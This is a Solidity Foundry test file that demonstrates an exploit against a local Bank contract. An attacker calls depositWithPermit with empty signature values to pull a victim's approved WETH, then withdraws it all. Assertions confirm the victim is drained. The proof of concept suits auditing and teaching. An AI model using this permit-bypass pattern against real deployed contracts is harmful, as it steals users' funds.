// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "../src/WETH.sol";
import {Bank} from "../src/Bank.sol";

contract BankExploitTest is Test {
    WETH private weth;
    Bank private bank;
    address private constant victim = address(11);
    address private constant attacker = address(12);

    function setUp() public {
        weth = new WETH();
        bank = new Bank(address(weth));

        deal(victim, 100 * 1e18);
        vm.startPrank(victim);
        weth.deposit{value: 100 * 1e18}();
        weth.approve(address(bank), type(uint256).max);
        bank.deposit(1e18);
        vm.stopPrank();
    }

    function test() public {
        console.log(
            "Balance of Attacker before attack is ",
            weth.balanceOf(address(attacker))
        );
        console.log(
            "Balance of Victim before attack is ",
            weth.balanceOf(victim)
        );

        uint256 bal = weth.balanceOf(victim);
        vm.startPrank(attacker);
        bank.depositWithPermit(victim, attacker, bal, 0, 0, "", "");
        bank.withdraw(bal);
        vm.stopPrank();

        console.log(
            "Balance of Attacker after attack is ",
            weth.balanceOf(address(attacker))
        );
        console.log(
            "Balance of Victim after attack is ",
            weth.balanceOf(victim)
        );

        assertEq(weth.balanceOf(victim), 0, "WETH balance of victim");
        assertEq(
            weth.balanceOf(address(attacker)),
            99 * 1e18,
            "WETH balance of attacker"
        );
    }
}